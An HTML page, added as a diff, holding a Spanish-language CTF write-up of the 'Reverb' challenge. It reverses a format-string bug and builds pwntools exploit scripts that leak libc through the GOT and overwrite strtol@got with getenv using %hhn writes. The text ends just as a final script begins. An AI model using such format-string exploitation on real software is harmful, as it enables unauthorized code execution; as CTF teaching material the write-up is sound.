@@ -1,0 +1,619 @@
+<!DOCTYPE html>
+<html>
+  <head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width initial-scale=1" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="robots" content="noindex">
+
+  <title>Writeup World Wide Reverb</title>
+
+  <meta name="description" content="Resolución del reto Reverb del CTF de World Wide">
+  <meta name="author" content="xchg2pwn">
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Writeup World Wide Reverb">
+  <meta name="twitter:description" content="Resolución del reto Reverb del CTF de World Wide">
+  <meta name="twitter:creator" content="xchg2pwn">  
+  <meta name="twitter:image" content="/images/otros/worldwide.png" />
+
+  <meta property="og:site_name" content="xchg2pwn" />
+  <meta property="og:type" content="article">
+  <meta property="og:title" content="Writeup World Wide Reverb">
+  <meta property="og:description" content="Resolución del reto Reverb del CTF de World Wide">
+  <meta property="og:image" content="/images/otros/worldwide.png" />
+
+  <link rel="manifest" href="/images/favicons/manifest.json">
+  <link rel="shortcut icon" type="image/png" sizes="64x64" href="/images/otros/worldwide.png">
+
+  <meta name="msapplication-TileColor" content="#ffc40d">
+  <meta name="msapplication-TileImage" content="/images/favicons/mstile-144x144.png">
+  <meta name="theme-color" content="#ffffff">
+  
+  <meta name="msapplication-TileColor" content="#ffc40d">
+  <meta name="msapplication-TileImage" content="/images/favicons/mstile-144x144.png">
+  <meta name="theme-color" content="#ffffff">
+
+  <link rel="stylesheet" href="/css/main.css?1678854914750547280">
+  <link rel="alternate" type="application/rss+xml" title="Writeup World Wide Reverb" href="/feed.xml">
+</head>
+
+  <body style="background-color: #282828;">
+  
+    <span class="mobile btn-mobile-menu">
+      <i class="icon icon-list btn-mobile-menu__icon"></i>
+      <i class="icon icon-x-circle btn-mobile-close__icon hidden"></i>
+    </span>
+
+<header class="panel-cover" style="background-image: url(/images/cover.jpg)">
+
+  <div class="panel-main">
+    <div class="panel-main__inner panel-inverted">
+      <div class="panel-main__content">
+
+          <img src="/images/profile.jpg" class="user-image zoomable" alt="xchg2pwn">
+          <h1 class="panel-cover__title panel-title scale-up-center">xchg2pwn</h1>
+
+        <hr class="panel-cover__divider">
+        <p class="panel-cover__description slide-top">Entusiasta del reversing y desarrollo de exploits</p>
+        <hr class="panel-cover__divider panel-cover__divider--secondary">
+
+        <div class="navigation-wrapper">
+         <nav class="cover-navigation cover-navigation--primary">
+            <ul class="navigation">
+              <li class="navigation__item grow"><a href="/challenges" title="xchg2pwn" class="blog-button">Challenges</a></li>
+            </ul>
+          </nav>
+
+          <nav class="cover-navigation navigation--social">
+            <ul class="navigation">
+
+              <li class="navigation__item grow">
+                <a href="https://github.com/xchg2pwn" title="Github" target="_blank">
+                  <i class="icon icon-social-github"></i>
+                  <span class="label">GitHub</span>
+                </a>
+              </li>
+
+              <li class="navigation__item grow">
+                <a href="https://linkedin.com/in/enrique-de-los-santos-694863233" title="Linkedin" target="_blank">
+                  <i class="icon icon-social-linkedin"></i>
+                  <span class="label">Linkedin</span>
+                </a>
+              </li>
+
+              <li class="navigation__item grow">
+                <a href="https://instagram.com/xchg2pwn" title="Instagram" target="_blank">
+                  <i class="icon icon-social-instagram"></i>
+                  <span class="label">Instagram</span>
+                </a>
+              </li>
+
+              <li class="navigation__item grow">
+                <a href="https://twitter.com/xchg2pwn" title="Twitter" target="_blank">
+                  <i class="icon icon-social-twitter"></i>
+                  <span class="label">Twitter</span>
+                </a>
+              </li>
+
+              <li class="navigation__item grow">
+                <a href="https://youtube.com/@xchg2pwn" title="Youtube" target="_blank">
+                  <i class="icon icon-social-youtube"></i>
+                  <span class="label">Youtube</span>
+                </a>
+              </li>
+
+              <li class="navigation__item grow">
+                <a href="mailto:xchg2pwn@gmail.com" title="Correo Electronico" target="_blank">
+                  <i class="icon icon-mail"></i>
+                  <span class="label">Email</span>
+                </a>
+              </li>              
+
+            </ul>
+          </nav>
+        </div>
+      </div>
+    </div>
+
+    <div class="panel-cover--overlay"></div>
+  </div>
+</header>
+    <br>
+    <div class="content-wrapper">
+      <div class="content-wrapper__inner">
+        <article class="post-container post-container--single">
+    <div class="izquierda">
+      <h3 class="post-title">Contenido</h3><br>
+      <ul>
+        <li><a href="#reversing">Reversing</a></li>
+        <li><a href="#exploitation">Explotación</a></li>
+      </ul>
+  </div>
+
+  <header class="post-header slide-top">
+    <h4 class="post-title">World Wide</h4>
+    <picture><img src="/images/otros/worldwide.png" style="float: right; margin-right:0px; margin-left:0px; height:100px;" class="include_image zoomable"/></picture>
+    <h2 class="post-title">Reverb</h2><br>
+  </header>
+  
+<section class="post" id="reversing">
+<br><h3 class="post-title">Reversing</h3><br>
+
+<p class="plain-text">Si ejecutamos el <a href="https://github.com/xchg2pwn/BinaryExploitation/blob/main/WorldWideCTF/BufferBrawl/buffer_brawl.zip">binario</a> nos devuelve como output lo que ingresemos como input</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ ./chall</span><span class="p">  
+>> AAAA
+AAAA
+>></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Analizaremos el funcionamiento del programa asi que iniciamos desensamblando la función <code class="language-plaintext highlighter-rouge">main</code>, esta establece que todo el stdin, stdout y stderr de redirige al <code class="language-plaintext highlighter-rouge">socket</code></p>
+<a href="/challenges/reverb/1.png" target="_blank"><div><p><img src="/challenges/reverb/1.png"></p></div></a>
+
+<p class="plain-text">Luego de mostrar un prompt recibe en una variable buffer <code class="language-plaintext highlighter-rouge">0x180</code> o <code class="language-plaintext highlighter-rouge">384</code> bytes con <code class="language-plaintext highlighter-rouge">fgets</code>, luego llama a la función <code class="language-plaintext highlighter-rouge">check</code> y si devuelve <code class="language-plaintext highlighter-rouge">1</code> lo devuelve con <code class="language-plaintext highlighter-rouge">printf</code> sin ningun formato, esto puede ocasionar una vulnerabilidad de tipo format string</p>
+<a href="/challenges/reverb/2.png" target="_blank"><div><p><img src="/challenges/reverb/2.png"></p></div></a>
+
+<p class="plain-text">La función <code class="language-plaintext highlighter-rouge">check</code> inicia definiendo un iterador <code class="language-plaintext highlighter-rouge">i</code> a <code class="language-plaintext highlighter-rouge">0</code>, luego inicia un bucle que se ejecutará mientras <code class="language-plaintext highlighter-rouge">i</code> sea menor o igual a <code class="language-plaintext highlighter-rouge">383</code>, osea toda la longitud del buffer</p>
+<a href="/challenges/reverb/3.png" target="_blank"><div><p><img src="/challenges/reverb/3.png"></p></div></a>
+
+<p class="plain-text">Por cada iteración accede al byte del buffer en la posición <code class="language-plaintext highlighter-rouge">i</code> y lo compara con <code class="language-plaintext highlighter-rouge">%</code>, en caso de que no se cumpla añade una unidad a <code class="language-plaintext highlighter-rouge">i</code> y vuelve nuevamente al bucle</p>
+<a href="/challenges/reverb/4.png" target="_blank"><div><p><img src="/challenges/reverb/4.png"></p></div></a>
+<a href="/challenges/reverb/5.png" target="_blank"><div><p><img src="/challenges/reverb/5.png"></p></div></a>
+
+<p class="plain-text">Si encuentra el byte <code class="language-plaintext highlighter-rouge">%</code> añade una unidad a <code class="language-plaintext highlighter-rouge">counter</code> y a <code class="language-plaintext highlighter-rouge">i</code>, luego accede al byte en la posición <code class="language-plaintext highlighter-rouge">i</code> y la compara con <code class="language-plaintext highlighter-rouge">0</code>, aqui tenemos la primera de varias limitaciones</p>
+<a href="/challenges/reverb/6.png" target="_blank"><div><p><img src="/challenges/reverb/6.png"></p></div></a>
+
+<p class="plain-text">Si pasa la condición compara si el byte se encuentra entre el rango <code class="language-plaintext highlighter-rouge">0-9</code>, ese rango es invalido y si existe simplemente sale del programa sin llegar al format string</p>
+<a href="/challenges/reverb/7.png" target="_blank"><div><p><img src="/challenges/reverb/7.png"></p></div></a>
+
+<p class="plain-text">Las condiciones anteriores nos dicen que luego del byte <code class="language-plaintext highlighter-rouge">%</code> al intentar explotar la vulnerabilidad no podemos acceder los datos en el rango de posiciones <code class="language-plaintext highlighter-rouge">1</code> a <code class="language-plaintext highlighter-rouge">9</code>, ni podemos anteponer el byte correspondiente a <code class="language-plaintext highlighter-rouge">0</code> en un intento de cumplirla</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ ./chall</span><span class="p">  
+>> %1$p</span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ ./chall</span><span class="p">  
+>> %01$p</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Si pasa las 2 condiciones anteriores llama a la función <code class="language-plaintext highlighter-rouge">strtol</code> para obtener el entero que forman los <code class="language-plaintext highlighter-rouge">2</code> bytes y compara que el resultado sea menor o igual a <code class="language-plaintext highlighter-rouge">57</code></p>
+<a href="/challenges/reverb/8.png" target="_blank"><div><p><img src="/challenges/reverb/8.png"></p></div></a>
+
+<p class="plain-text">Esto supone una limitación bastante importante a la hora de explotar la vulnerabilidad ya que solo podemos usar un corto rango de posiciones desde la <code class="language-plaintext highlighter-rouge">10</code> hasta la <code class="language-plaintext highlighter-rouge">57</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ ./chall</span><span class="p">  
+>> %58$p</span>
+</code></pre></div></div><br>
+
+</section>
+
+<section class="post" id="exploitation">
+<br><h3 class="post-title">Explotación</h3><br>
+
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ checksec </span><span class="p">chall
+[</span><span class="az">*</span><span class="p">] '/home/user/chall'
+    Arch:       amd64-64-little
+    RELRO:      </span><span class="am">Partial RELRO</span><span class="p">
+    Stack:      </span><span class="ve">Canary found</span><span class="p">
+    NX:         </span><span class="ve">NX enabled</span><span class="p">
+    PIE:        </span><span class="ro">No PIE (0x3fe000)  </span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ ./chall</span><span class="p">
+>> %10$p.%11$p.%12$p
+0x31252e7024303125.0x243231252e702431.0xa70  
+>></span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="c1">#!/usr/bin/python3
+</span><span class="o">from</span><span class="p"> pwn</span><span class="o"> import</span><span class="p"> process, log
+
+shell </span><span class="o">= </span><span class="p">process(</span><span class="s">"./chall"</span><span class="p">)
+
+</span><span class="o">for</span><span class="p"> i</span><span class="o"> in</span><span class="no"> range</span><span class="p">(</span><span class="mi">10</span><span class="p">,</span><span class="mi"> 58</span><span class="p">):
+    shell.sendlineafter(</span><span class="no">b</span><span class="s">">> "</span><span class="p">,</span><span class="no"> f</span><span class="s">"%</span><span class="p">{i}</span><span class="s">$p"</span><span class="p">.encode())  
+    leak</span><span class="o"> =</span><span class="p"> shell.recvline().strip().decode()
+
+    log.info(</span><span class="no">f</span><span class="s">"</span><span class="p">{i}</span><span class="s">:</span><span class="p"> {leak}</span><span class="s">"</span><span class="p">)
+
+shell.interactive()</span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ python3</span><span class="p"> exploit.py
+[</span><span class="ve">+</span><span class="p">] Starting local process '/usr/bin/gdbserver': pid 1247758
+[</span><span class="az">*</span><span class="p">] running in new terminal: ['/usr/bin/gdb', '-q', './chall']  
+[</span><span class="az">*</span><span class="p">] 10: 0xa7024303125
+[</span><span class="az">*</span><span class="p">] 11: (nil)
+[</span><span class="az">*</span><span class="p">] 12: (nil)
+[</span><span class="az">*</span><span class="p">] 13: (nil)
+[</span><span class="az">*</span><span class="p">] 14: (nil)
+[</span><span class="az">*</span><span class="p">] 15: (nil)
+[</span><span class="az">*</span><span class="p">] 16: (nil)
+[</span><span class="az">*</span><span class="p">] 17: (nil)
+[</span><span class="az">*</span><span class="p">] 18: (nil)
+[</span><span class="az">*</span><span class="p">] 19: (nil)
+.............
+[</span><span class="az">*</span><span class="p">] 50: (nil)
+[</span><span class="az">*</span><span class="p">] 51: (nil)
+[</span><span class="az">*</span><span class="p">] 52: (nil)
+[</span><span class="az">*</span><span class="p">] 53: (nil)
+[</span><span class="az">*</span><span class="p">] 54: (nil)
+[</span><span class="az">*</span><span class="p">] 55: (nil)
+[</span><span class="az">*</span><span class="p">] 56: (nil)
+[</span><span class="az">*</span><span class="p">] 57: (nil)
+[</span><span class="az">*</span><span class="p">] Switching to interactive mode
+>> </span><span class="ro">$</span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ unhex</span><span class="p"> 31252e7024303125 | </span><span class="ve">rev</span><span class="p">  
+%10$p.%1
+
+</span><span class="ve">❯ unhex</span><span class="p"> 243231252e702431 |</span><span class="ve"> rev</span><span class="p">  
+1$p.%12$</span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">>> %11$p...AAAABBBB
+0x4242424241414141...AAAABBBB  
+>></span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ro">pwndbg></span><span class="p"> got -r strtol
+Filtering by symbol name: strtol
+
+State of the GOT of </span><span class="sa">/home/user/chall</span><span class="p">:
+GOT protection: </span><span class="am">Partial RELRO</span><span class="p"> | Found </span><span class="am">1</span><span class="p"> GOT entries passing the filter  
+[</span><span class="sa">0x404030</span><span class="p">]</span><span class="am"> strtol@GLIBC_2.2.5</span><span class="p"> -> </span><span class="ro">0x401060 </span><span class="p">◂— </span><span class="na">endbr64</span><span class="p">
+</span><span class="ro">pwndbg></span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ readelf</span><span class="p"> -s libc.so.6 |</span><span class="ve"> grep</span><span class="p"> strtol@
+  1204: 00000000000474e0    22 FUNC    WEAK   DEFAULT   15 </span><span class="ro">strtol@</span><span class="p">@GLIBC_2.2.5</span>  
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="c1">#!/usr/bin/python3
+</span><span class="o">from</span><span class="p"> pwn</span><span class="o"> import</span><span class="p"> gdb, p64, u64, log
+
+shell</span><span class="o"> =</span><span class="p"> gdb.debug(</span><span class="s">"./chall"</span><span class="p">,</span><span class="s"> "continue"</span><span class="p">)
+
+payload</span><span class="o"> =</span><span class="no"> b</span><span class="s">"%11$s..." </span><span class="o">+ </span><span class="p">p64(</span><span class="mi">0x404030</span><span class="p">)</span><span class="c1"> # strtol@got</span><span class="p">
+shell.sendlineafter(</span><span class="no">b</span><span class="s">">> "</span><span class="p">, payload)
+
+libc_base</span><span class="o"> =</span><span class="p"> u64(shell.recvuntil(</span><span class="no">b</span><span class="s">"..."</span><span class="p">)[:</span><span class="o">-</span><span class="mi">3</span><span class="p">].ljust(</span><span class="mi">8</span><span class="p">, </span><span class="no">b</span><span class="s">"</span><span class="mi">\x00</span><span class="s">"</span><span class="p">)) </span><span class="o">- </span><span class="mi">0x474e0</span><span class="p">  
+log.info(</span><span class="no">f</span><span class="s">"Libc base:</span><span class="p"> {</span><span class="no">hex</span><span class="p">(libc_base)}</span><span class="s">"</span><span class="p">)
+
+shell.interactive()</span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ python3 </span><span class="p">exploit.py
+[</span><span class="ve">+</span><span class="p">] Starting local process '/usr/bin/gdbserver': pid 834697
+[</span><span class="az">*</span><span class="p">] running in new terminal: ['/usr/bin/gdb', '-q', './chall']  
+[</span><span class="az">*</span><span class="p">] Libc base: 0x7c488ce00000
+[</span><span class="az">*</span><span class="p">] Switching to interactive mode
+>> </span><span class="ro">$</span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">^C
+Program received signal SIGINT, Interrupt.
+</span><span class="az">0x00007c488cf147e2 </span><span class="p">in</span><span class="am"> read</span><span class="p"> () from</span><span class="ve"> ./libc.so.6</span><span class="p">
+</span><span class="ro">pwndbg></span><span class="p"> vmmap libc.so.6
+LEGEND:</span><span class="am"> STACK</span><span class="p"> |</span><span class="az"> HEAP</span><span class="p"> |</span><span class="ro"> CODE</span><span class="p"> |</span><span class="sa"> DATA</span><span class="p"> |</span><span class="ro"> WX</span><span class="p"> | RODATA
+             Start                End Perm     Size Offset File
+</span><span class="sa">          0x404000           0x405000 rw-p     1000   5000 /home/user/chall
+</span><span class="p">►   0x7c488ce00000     0x7c488ce28000 r--p    28000      0 /home/user/libc.so.6
+</span><span class="ro">►   0x7c488ce28000     0x7c488cfbd000 r-xp   195000  28000 /home/user/libc.so.6
+</span><span class="p">►   0x7c488cfbd000     0x7c488d015000 r--p    58000 1bd000 /home/user/libc.so.6
+</span><span class="az">►   0x7c488d015000     0x7c488d016000 ---p     1000 215000 /home/user/libc.so.6
+</span><span class="p">►   0x7c488d016000     0x7c488d01a000 r--p     4000 215000 /home/user/libc.so.6
+</span><span class="sa">►   0x7c488d01a000     0x7c488d01c000 rw-p     2000 219000 /home/user/libc.so.6
+</span><span class="p">    0x7c488d093000     0x7c488d095000 r--p     2000      0 /home/user/ld-linux-x86-64.so.2  
+</span><span class="ro">pwndbg></span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ readelf </span><span class="p">-s libc.so.6 |</span><span class="ve"> grep</span><span class="p"> getenv
+  1808: 0000000000044b70   229 FUNC    GLOBAL DEFAULT   15 </span><span class="ro">getenv</span><span class="p">@@GLIBC_2.2.5  </span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="o">def</span><span class="na"> write</span><span class="p">(</span><span class="am">what</span><span class="p">,</span><span class="am"> where</span><span class="p">):
+    payload  </span><span class="o">= </span><span class="no">b</span><span class="s">""</span><span class="p">
+
+    array</span><span class="o"> =</span><span class="p"> []
+
+    </span><span class="o">for</span><span class="p"> i</span><span class="o"> in</span><span class="no"> range</span><span class="p">(</span><span class="mi">8</span><span class="p">):
+        array.append((where</span><span class="o"> +</span><span class="p"> i, what</span><span class="o"> &</span><span class="mi"> 0xff</span><span class="p">))  
+        what</span><span class="o"> >>= </span><span class="mi">8</span><span class="p">
+
+    array</span><span class="o"> =</span><span class="no"> sorted</span><span class="p">(array, </span><span class="am">key</span><span class="o">=lambda</span><span class="am"> x</span><span class="p">: x[</span><span class="mi">1</span><span class="p">])</span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ python3 </span><span class="p">-q
+>>> (49 - 10 + 8) * 8  
+376
+>>> (50 - 10 + 8) * 8  
+384
+>>></span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">>>> (49 - 10) * 8  
+312
+>>></span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">    written </span><span class="o">= </span><span class="mi">0</span><span class="p">
+    i</span><span class="o"> =</span><span class="mi"> 49</span><span class="p">
+
+    </span><span class="o">for</span><span class="p"> address, value</span><span class="o"> in</span><span class="p"> array:
+        payload</span><span class="o"> +=</span><span class="no"> b</span><span class="s">"A"</span><span class="o"> *</span><span class="p"> (value </span><span class="o">- </span><span class="p">written)  
+        payload</span><span class="o"> +=</span><span class="no"> f</span><span class="s">"%</span><span class="p">{i}</span><span class="s">$hhn"</span><span class="p">.encode()
+
+        written </span><span class="o">= </span><span class="p">value
+        i</span><span class="o"> +=</span><span class="mi"> 1</span><span class="p">
+
+    payload</span><span class="o"> +=</span><span class="no"> b</span><span class="s">"A"</span><span class="o"> *</span><span class="p"> (</span><span class="mi">312</span><span class="o"> -</span><span class="no"> len</span><span class="p">(payload))
+
+    </span><span class="o">for</span><span class="p"> address, value </span><span class="o">in</span><span class="p"> array:
+        payload </span><span class="o">+= </span><span class="p">p64(address)
+
+    shell.sendlineafter(</span><span class="no">b</span><span class="s">">> "</span><span class="p">, payload)</span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="c1">#!/usr/bin/python3
+</span><span class="o">from</span><span class="p"> pwn</span><span class="o"> import</span><span class="p"> gdb, p64, u64
+
+shell</span><span class="o"> =</span><span class="p"> gdb.debug(</span><span class="s">"./chall"</span><span class="p">,</span><span class="s"> "continue"</span><span class="p">)
+
+</span><span class="o">def</span><span class="na"> write</span><span class="p">(</span><span class="am">what</span><span class="p">,</span><span class="am"> where</span><span class="p">):
+    payload  </span><span class="o">= </span><span class="no">b</span><span class="s">""</span><span class="p">
+
+    array</span><span class="o"> =</span><span class="p"> []
+
+    </span><span class="o">for</span><span class="p"> i</span><span class="o"> in</span><span class="no"> range</span><span class="p">(</span><span class="mi">8</span><span class="p">):
+        array.append((where</span><span class="o"> +</span><span class="p"> i, what</span><span class="o"> &</span><span class="mi"> 0xff</span><span class="p">))
+        what</span><span class="o"> >>= </span><span class="mi">8</span><span class="p">
+
+    array</span><span class="o"> =</span><span class="no"> sorted</span><span class="p">(array, </span><span class="am">key</span><span class="o">=lambda</span><span class="am"> x</span><span class="p">: x[</span><span class="mi">1</span><span class="p">])
+
+    written </span><span class="o">= </span><span class="mi">0</span><span class="p">
+    i</span><span class="o"> =</span><span class="mi"> 49</span><span class="p">
+
+    </span><span class="o">for</span><span class="p"> address, value</span><span class="o"> in</span><span class="p"> array:
+        payload</span><span class="o"> +=</span><span class="no"> b</span><span class="s">"A"</span><span class="o"> *</span><span class="p"> (value </span><span class="o">- </span><span class="p">written)
+        payload</span><span class="o"> +=</span><span class="no"> f</span><span class="s">"%</span><span class="p">{i}</span><span class="s">$hhn"</span><span class="p">.encode()
+
+        written </span><span class="o">= </span><span class="p">value
+        i</span><span class="o"> +=</span><span class="mi"> 1</span><span class="p">
+
+    payload</span><span class="o"> +=</span><span class="no"> b</span><span class="s">"A"</span><span class="o"> *</span><span class="p"> (</span><span class="mi">312</span><span class="o"> -</span><span class="no"> len</span><span class="p">(payload))
+
+    </span><span class="o">for</span><span class="p"> address, value </span><span class="o">in</span><span class="p"> array:
+        payload </span><span class="o">+= </span><span class="p">p64(address)
+
+    shell.sendlineafter(</span><span class="no">b</span><span class="s">">> "</span><span class="p">, payload)
+
+payload</span><span class="o"> =</span><span class="no"> b</span><span class="s">"%11$s..."</span><span class="o"> +</span><span class="p"> p64(</span><span class="mi">0x404030</span><span class="p">)</span><span class="c1"> # strtol@got</span><span class="p">
+shell.sendlineafter(</span><span class="no">b</span><span class="s">">> "</span><span class="p">, payload)
+
+libc_base </span><span class="o">= </span><span class="p">u64(shell.recvuntil(</span><span class="no">b</span><span class="s">"..."</span><span class="p">)[:</span><span class="o">-</span><span class="mi">3</span><span class="p">].ljust(</span><span class="mi">8</span><span class="p">, </span><span class="no">b</span><span class="s">"</span><span class="mi">\x00</span><span class="s">"</span><span class="p">)) </span><span class="o">-</span><span class="mi"> 0x474e0</span><span class="p">  
+
+write(libc_base</span><span class="o"> +</span><span class="mi"> 0x044b70</span><span class="p">,</span><span class="mi"> 0x404030</span><span class="p">)</span><span class="c1"> # strtol@got = getenv@glibc</span><span class="p">
+shell.interactive()</span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">^C
+Program received signal SIGINT, Interrupt.
+</span><span class="az">0x00007382ccd147e2</span><span class="p"> in</span><span class="am"> read</span><span class="p"> () from</span><span class="ve"> ./libc.so.6</span><span class="p">
+</span><span class="ro">pwndbg></span><span class="p"> x/gx 0x404030
+</span><span class="az">0x404030 </span><span class="p">&lt</span><span class="am">strtol@got.plt</span><span class="p">>:      0x00007382ccc44b70  
+</span><span class="ro">pwndbg></span><span class="p"> x/gx *(long long *)(0x404030)
+</span><span class="az">0x7382ccc44b70</span><span class="p"> &lt</span><span class="am">getenv</span><span class="p">>:        0x56415741fa1e0ff3  
+</span><span class="ro">pwndbg></span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="c1">#!/usr/bin/python3
+</span><span class="o">from</span><span class="p"> pwn</span><span class="o"> import</span><span class="p"> gdb, p64, u64, log
+
+shell</span><span class="o"> =</span><span class="p"> gdb.debug(</span><span class="s">"./chall"</span><span class="p">,</span><span class="s"> "continue"</span><span class="p">)
+
+</span><span class="o">def</span><span class="na"> write</span><span class="p">(</span><span class="am">what</span><span class="p">,</span><span class="am"> where</span><span class="p">):
+    ...................
+
+payload</span><span class="o"> =</span><span class="no"> b</span><span class="s">"%11$s..."</span><span class="o"> +</span><span class="p"> p64(</span><span class="mi">0x404030</span><span class="p">)</span><span class="c1"> # strtol@got</span><span class="p">
+shell.sendlineafter(</span><span class="no">b</span><span class="s">">> "</span><span class="p">, payload)
+
+libc_base </span><span class="o">= </span><span class="p">u64(shell.recvuntil(</span><span class="no">b</span><span class="s">"..."</span><span class="p">)[:</span><span class="o">-</span><span class="mi">3</span><span class="p">].ljust(</span><span class="mi">8</span><span class="p">, </span><span class="no">b</span><span class="s">"</span><span class="mi">\x00</span><span class="s">"</span><span class="p">)) </span><span class="o">-</span><span class="mi"> 0x474e0</span><span class="p">  
+
+write(libc_base</span><span class="o"> +</span><span class="mi"> 0x044b70</span><span class="p">,</span><span class="mi"> 0x404030</span><span class="p">)</span><span class="c1"> # strtol@got = getenv@glibc</span><span class="p">
+
+</span><span class="o">for</span><span class="p"> i</span><span class="o"> in</span><span class="no"> range</span><span class="p">(</span><span class="mi">50</span><span class="p">,</span><span class="mi"> 70</span><span class="p">):
+    shell.sendlineafter(</span><span class="no">b</span><span class="s">">> "</span><span class="p">,</span><span class="no"> f</span><span class="s">"%</span><span class="p">{i}</span><span class="s">$p"</span><span class="p">.encode())
+    leak</span><span class="o"> =</span><span class="p"> shell.recvline().strip().decode()
+
+    log.info(</span><span class="no">f</span><span class="s">"</span><span class="p">{i}</span><span class="s">:</span><span class="p"> {leak}</span><span class="s">"</span><span class="p">)
+
+shell.interactive()</span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ python3</span><span class="p"> exploit.py
+[</span><span class="ve">+</span><span class="p">] Starting local process '/usr/bin/gdbserver': pid 1249736
+[</span><span class="az">*</span><span class="p">] running in new terminal: ['/usr/bin/gdb', '-q', './chall']  
+[</span><span class="az">*</span><span class="p">] 50: 0x404037
+[</span><span class="az">*</span><span class="p">] 51: 0x404033
+[</span><span class="az">*</span><span class="p">] 52: 0x404031
+[</span><span class="az">*</span><span class="p">] 53: 0x404030
+[</span><span class="az">*</span><span class="p">] 54: 0x404035
+[</span><span class="az">*</span><span class="p">] 55: 0x404034
+[</span><span class="az">*</span><span class="p">] 56: 0x404032
+[</span><span class="az">*</span><span class="p">] 57: 0xa
+[</span><span class="az">*</span><span class="p">] 58: (nil)
+[</span><span class="az">*</span><span class="p">] 59: 0x5731707d0f649300
+[</span><span class="az">*</span><span class="p">] 60: 0x1
+[</span><span class="az">*</span><span class="p">] 61: 0x71953ce29d90
+[</span><span class="az">*</span><span class="p">] 62: (nil)
+[</span><span class="az">*</span><span class="p">] 63: 0x40137a
+[</span><span class="az">*</span><span class="p">] 64: 0x100000000
+[</span><span class="az">*</span><span class="p">] 65: 0x7ffdab10fb98
+[</span><span class="az">*</span><span class="p">] 66: (nil)
+[</span><span class="az">*</span><span class="p">] 67: 0xb23607c7e97a057f
+[</span><span class="az">*</span><span class="p">] 68: 0x7ffdab10fb98
+[</span><span class="az">*</span><span class="p">] 69: 0x40137a
+[</span><span class="az">*</span><span class="p">] Switching to interactive mode
+>> </span><span class="ro">$</span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ro">pwndbg></span><span class="p"> vmmap 0x7ffdab10fb98
+LEGEND:</span><span class="am"> STACK</span><span class="p"> | </span><span class="az">HEAP</span><span class="p"> |</span><span class="ro"> CODE</span><span class="p"> |</span><span class="sa"> DATA </span><span class="p">| </span><span class="ro">WX</span><span class="p"> | RODATA
+             Start                End Perm     Size Offset File
+</span><span class="sa">    0x71953d1eb000     0x71953d1ed000 rw-p     2000  39000 /home/user/ld-linux-x86-64.so.2  
+</span><span class="am">►   0x7ffdab0f1000     0x7ffdab112000 rw-p    21000      0 [stack] +0x1eb98
+</span><span class="p">    0x7ffdab11b000     0x7ffdab11f000 r--p     4000      0 [vvar]
+</span><span class="ro">pwndbg></span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="c1">#!/usr/bin/python3
+</span><span class="o">from</span><span class="p"> pwn </span><span class="o">import</span><span class="p"> gdb, p64, u64, log
+
